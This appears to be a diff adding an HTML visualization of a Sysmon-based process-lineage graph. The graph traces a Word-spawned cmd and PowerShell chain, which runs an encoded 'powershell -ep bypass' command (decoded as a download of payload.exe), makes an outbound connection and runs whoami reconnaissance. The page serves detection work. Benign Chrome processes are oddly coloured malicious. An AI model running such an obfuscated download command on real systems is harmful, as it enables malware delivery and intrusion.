@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PASTE Engine – Process Provenance & Network Egress DAG</title>
+  <script type="text/javascript" src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background-color: #0f172a;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+    header {
+      background: #1e293b;
+      padding: 12px 24px;
+      border-bottom: 1px solid #334155;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+    }
+    .title-group h1 {
+      font-size: 1.15rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      color: #38bdf8;
+    }
+    .title-group p {
+      font-size: 0.8rem;
+      color: #94a3b8;
+    }
+    .legend {
+      display: flex;
+      gap: 16px;
+      font-size: 0.78rem;
+    }
+    .legend-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .legend-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 3px;
+    }
+    #network-container {
+      flex: 1;
+      position: relative;
+      background: radial-gradient(circle at 50% 50%, #1e293b 0%, #0f172a 100%);
+    }
+    #vis-network {
+      width: 100%;
+      height: 100%;
+    }
+    .control-panel {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(30, 41, 59, 0.85);
+      backdrop-filter: blur(8px);
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: 1px solid #334155;
+      display: flex;
+      gap: 10px;
+      z-index: 20;
+    }
+    button {
+      background: #334155;
+      color: #f8fafc;
+      border: 1px solid #475569;
+      padding: 6px 12px;
+      font-size: 0.75rem;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.15s ease;
+    }
+    button:hover {
+      background: #475569;
+    }
+    .stats-card {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      background: rgba(30, 41, 59, 0.85);
+      backdrop-filter: blur(8px);
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: 1px solid #334155;
+      font-size: 0.78rem;
+      color: #cbd5e1;
+      z-index: 20;
+      line-height: 1.5;
+    }
+    .stats-card b {
+      color: #38bdf8;
+    }
+    /* Vis.js Tooltip Styling Override */
+    div.vis-tooltip {
+      background-color: #1e293b !important;
+      border: 1px solid #475569 !important;
+      color: #f8fafc !important;
+      font-family: inherit !important;
+      font-size: 12px !important;
+      padding: 10px 14px !important;
+      border-radius: 6px !important;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5) !important;
+      max-width: 480px !important;
+      line-height: 1.4 !important;
+      z-index: 1000 !important;
+    }
+    code {
+      background: #0f172a;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 11px;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="title-group">
+      <h1>PASTE Autonomous Engine · Provenance Graph</h1>
+      <p>Causality-Aware Process Lineage & Network Egress DAG</p>
+    </div>
+    <div class="legend">
+      <div class="legend-item"><span class="legend-dot" style="background:#64748b"></span> Root / Parent</div>
+      <div class="legend-item"><span class="legend-dot" style="background:#ef4444"></span> Malicious Process</div>
+      <div class="legend-item"><span class="legend-dot" style="background:#06b6d4"></span> Network Socket</div>
+      <div class="legend-item"><span class="legend-dot" style="background:#f59e0b"></span> Decoded Payload</div>
+    </div>
+  </header>
+
+  <div id="network-container">
+    <div class="stats-card">
+      <div><b>Graph Size:</b> 10 Nodes &bull; 8 Directed Edges</div>
+      <div><b>Telemetry:</b> Sysmon EID 1 (Process) + EID 3 (Network)</div>
+      <div><b>Navigation:</b> Drag to Pan &bull; Scroll to Zoom &bull; Hover for Details</div>
+    </div>
+
+    <div id="vis-network"></div>
+
+    <div class="control-panel">
+      <button onclick="network.fit({animation: true})">Fit View</button>
+      <button onclick="togglePhysics()">Toggle Physics</button>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    const nodes = new vis.DataSet([
+  {
+    "id": "{a1b2c3d4-1001-6730-0001-000000000100}",
+    "label": "[explorer.exe]\nPID: 4012",
+    "title": "<b>Process:</b> explorer.exe (PID 4012)<br><b>Full Path:</b> C:\\Windows\\explorer.exe<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 08:30:01.234<br><b>Command:</b> <code>C:\\Windows\\explorer.exe</code>",
+    "shape": "box",
+    "color": {
+      "background": "#64748b",
+      "border": "#475569",
+      "highlight": {
+        "background": "#94a3b8",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  },
+  {
+    "id": "{a1b2c3d4-1002-6730-0002-000000000200}",
+    "label": "[chrome.exe]\nPID: 7284",
+    "title": "<b>Process:</b> chrome.exe (PID 7284)<br><b>Full Path:</b> C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 08:30:05.891<br><b>Command:</b> <code>&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot; --profile-directory=Default</code>",
+    "shape": "box",
+    "color": {
+      "background": "#ef4444",
+      "border": "#dc2626",
+      "highlight": {
+        "background": "#f87171",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  },
+  {
+    "id": "{a1b2c3d4-1003-6730-0003-000000000300}",
+    "label": "[chrome.exe]\nPID: 7312",
+    "title": "<b>Process:</b> chrome.exe (PID 7312)<br><b>Full Path:</b> C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 08:30:06.452<br><b>Command:</b> <code>&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot; --type=renderer --lang=en-US --enable-auto-reload</code>",
+    "shape": "box",
+    "color": {
+      "background": "#ef4444",
+      "border": "#dc2626",
+      "highlight": {
+        "background": "#f87171",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  },
+  {
+    "id": "{a1b2c3d4-2001-6730-0004-000000000400}",
+    "label": "[winword.exe]\nPID: 5560",
+    "title": "<b>Process:</b> winword.exe (PID 5560)<br><b>Full Path:</b> C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 09:15:22.100<br><b>Command:</b> <code>&quot;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&quot; /n &quot;C:\\Users\\mhassan\\Documents\\Q3_Report.docx&quot;</code>",
+    "shape": "box",
+    "color": {
+      "background": "#64748b",
+      "border": "#475569",
+      "highlight": {
+        "background": "#94a3b8",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  },
+  {
+    "id": "{a1b2c3d4-2002-6730-0005-000000000500}",
+    "label": "[cmd.exe]\nPID: 8844",
+    "title": "<b>Process:</b> cmd.exe (PID 8844)<br><b>Full Path:</b> C:\\Windows\\System32\\cmd.exe<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 09:15:33.785<br><b>Command:</b> <code>cmd.exe /c powershell -ep bypass -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUA</code><br><br><b>Decoded Payload:</b><br><code style='color:#f59e0b;'>Invoke-WebRequest -Uri http://192.168.1.50/payload.exe</code>",
+    "shape": "box",
+    "color": {
+      "background": "#ef4444",
+      "border": "#dc2626",
+      "highlight": {
+        "background": "#f87171",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  },
+  {
+    "id": "payload_{a1b2c3d4-2002-6730-0005-000000000500}",
+    "label": "[DECODED PAYLOAD]\nInvoke-WebRequest -Uri http://192.168.1.50...",
+    "title": "<b>Decoded PowerShell Payload:</b><br><code>Invoke-WebRequest -Uri http://192.168.1.50/payload.exe</code>",
+    "shape": "ellipse",
+    "color": {
+      "background": "#f59e0b",
+      "border": "#d97706",
+      "highlight": {
+        "background": "#fbbf24",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#0f172a",
+      "face": "monospace",
+      "size": 11,
+      "bold": true
+    },
+    "borderWidth": 2
+  },
+  {
+    "id": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "label": "[powershell.exe]\nPID: 9916",
+    "title": "<b>Process:</b> powershell.exe (PID 9916)<br><b>Full Path:</b> C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 09:15:34.201<br><b>Command:</b> <code>powershell -ep bypass -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUA</code><br><br><b>Decoded Payload:</b><br><code style='color:#f59e0b;'>Invoke-WebRequest -Uri http://192.168.1.50/payload.exe</code>",
+    "shape": "box",
+    "color": {
+      "background": "#ef4444",
+      "border": "#dc2626",
+      "highlight": {
+        "background": "#f87171",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  },
+  {
+    "id": "payload_{a1b2c3d4-2003-6730-0006-000000000600}",
+    "label": "[DECODED PAYLOAD]\nInvoke-WebRequest -Uri http://192.168.1.50...",
+    "title": "<b>Decoded PowerShell Payload:</b><br><code>Invoke-WebRequest -Uri http://192.168.1.50/payload.exe</code>",
+    "shape": "ellipse",
+    "color": {
+      "background": "#f59e0b",
+      "border": "#d97706",
+      "highlight": {
+        "background": "#fbbf24",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#0f172a",
+      "face": "monospace",
+      "size": 11,
+      "bold": true
+    },
+    "borderWidth": 2
+  },
+  {
+    "id": "socket_{a1b2c3d4-2003-6730-0006-000000000600}_198.51.100.42_443",
+    "label": "[EGRESS: TCP]\n198.51.100.42:443\n(update-telemetry-check.com)",
+    "title": "<b>Type:</b> Network Socket (Sysmon EID 3)<br><b>Protocol:</b> TCP<br><b>Destination:</b> 198.51.100.42:443<br><b>Hostname:</b> update-telemetry-check.com<br><b>Initiated:</b> true<br><b>Timestamp:</b> 2026-11-09 09:15:36.201",
+    "shape": "diamond",
+    "color": {
+      "background": "#06b6d4",
+      "border": "#0891b2",
+      "highlight": {
+        "background": "#22d3ee",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 12
+    },
+    "borderWidth": 2
+  },
+  {
+    "id": "{a1b2c3d4-2004-6730-0007-000000000700}",
+    "label": "[whoami.exe]\nPID: 10204",
+    "title": "<b>Process:</b> whoami.exe (PID 10204)<br><b>Full Path:</b> C:\\Windows\\System32\\whoami.exe<br><b>User:</b> DESKTOP-ROG\\mhassan<br><b>Timestamp:</b> 2026-11-09 09:15:35.670<br><b>Command:</b> <code>whoami.exe /all</code>",
+    "shape": "box",
+    "color": {
+      "background": "#ef4444",
+      "border": "#dc2626",
+      "highlight": {
+        "background": "#f87171",
+        "border": "#ffffff"
+      }
+    },
+    "font": {
+      "color": "#ffffff",
+      "face": "monospace",
+      "size": 13,
+      "bold": true
+    },
+    "borderWidth": 2,
+    "margin": 10
+  }
+]);
+    const edges = new vis.DataSet([
+  {
+    "from": "{a1b2c3d4-2002-6730-0005-000000000500}",
+    "to": "payload_{a1b2c3d4-2002-6730-0005-000000000500}",
+    "arrows": "to",
+    "color": {
+      "color": "#f59e0b",
+      "highlight": "#fbbf24"
+    },
+    "dashes": true,
+    "width": 2,
+    "label": "de-obfuscated",
+    "font": {
+      "color": "#f59e0b",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "to": "payload_{a1b2c3d4-2003-6730-0006-000000000600}",
+    "arrows": "to",
+    "color": {
+      "color": "#f59e0b",
+      "highlight": "#fbbf24"
+    },
+    "dashes": true,
+    "width": 2,
+    "label": "de-obfuscated",
+    "font": {
+      "color": "#f59e0b",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-1001-6730-0001-000000000100}",
+    "to": "{a1b2c3d4-1002-6730-0002-000000000200}",
+    "arrows": "to",
+    "color": {
+      "color": "#94a3b8",
+      "highlight": "#ffffff"
+    },
+    "dashes": false,
+    "width": 2,
+    "label": "spawns",
+    "font": {
+      "color": "#94a3b8",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-1002-6730-0002-000000000200}",
+    "to": "{a1b2c3d4-1003-6730-0003-000000000300}",
+    "arrows": "to",
+    "color": {
+      "color": "#94a3b8",
+      "highlight": "#ffffff"
+    },
+    "dashes": false,
+    "width": 2,
+    "label": "spawns",
+    "font": {
+      "color": "#94a3b8",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-2001-6730-0004-000000000400}",
+    "to": "{a1b2c3d4-2002-6730-0005-000000000500}",
+    "arrows": "to",
+    "color": {
+      "color": "#94a3b8",
+      "highlight": "#ffffff"
+    },
+    "dashes": false,
+    "width": 2,
+    "label": "spawns",
+    "font": {
+      "color": "#94a3b8",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-2002-6730-0005-000000000500}",
+    "to": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "arrows": "to",
+    "color": {
+      "color": "#94a3b8",
+      "highlight": "#ffffff"
+    },
+    "dashes": false,
+    "width": 2,
+    "label": "spawns",
+    "font": {
+      "color": "#94a3b8",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "to": "socket_{a1b2c3d4-2003-6730-0006-000000000600}_198.51.100.42_443",
+    "arrows": "to",
+    "color": {
+      "color": "#06b6d4",
+      "highlight": "#ffffff"
+    },
+    "dashes": true,
+    "width": 2,
+    "label": "TCP egress",
+    "font": {
+      "color": "#94a3b8",
+      "size": 10,
+      "align": "top"
+    }
+  },
+  {
+    "from": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "to": "{a1b2c3d4-2004-6730-0007-000000000700}",
+    "arrows": "to",
+    "color": {
+      "color": "#94a3b8",
+      "highlight": "#ffffff"
+    },
+    "dashes": false,
+    "width": 2,
+    "label": "spawns",
+    "font": {
+      "color": "#94a3b8",
+      "size": 10,
+      "align": "top"
+    }
+  }
+]);
+
+    const container = document.getElementById('vis-network');
+    const data = { nodes: nodes, edges: edges };
+
+    const options = {
+      layout: {
+        hierarchical: {
+          enabled: true,
+          direction: 'UD',
+          sortMethod: 'directed',
+          levelSeparation: 130,
+          nodeSpacing: 240,
+          treeSpacing: 260,
+          blockShifting: true,
+          edgeMinimization: true,
+        }
+      },
+      physics: {
+        enabled: false,
+        hierarchicalRepulsion: {
+          nodeDistance: 190
+        }
+      },
+      interaction: {
+        hover: true,
+        tooltipDelay: 100,
+        zoomView: true,
+        dragView: true,
+        multiselect: false,
+      },
+      nodes: {
+        shadow: {
+          enabled: true,
+          color: 'rgba(0,0,0,0.4)',
+          size: 10,
+          x: 2,
+          y: 4
+        }
+      },
+      edges: {
+        smooth: {
+          type: 'cubicBezier',
+          forceDirection: 'vertical',
+          roundness: 0.5
+        }
+      }
+    };
+
+    let network = null;
+    let physicsEnabled = false;
+
+    try {
+      network = new vis.Network(container, data, options);
+    } catch (err) {
+      console.warn("Vis.js initialization failed or offline:", err);
+      container.innerHTML = "<div style='padding:40px; color:#ef4444;'>Vis.js renderer offline. Process tree nodes: " + nodes.length + ", Edges: " + edges.length + "</div>";
+    }
+
+    function togglePhysics() {
+      if (!network) return;
+      physicsEnabled = !physicsEnabled;
+      network.setOptions({ physics: { enabled: physicsEnabled } });
+    }
+  </script>
+</body>
+</html>
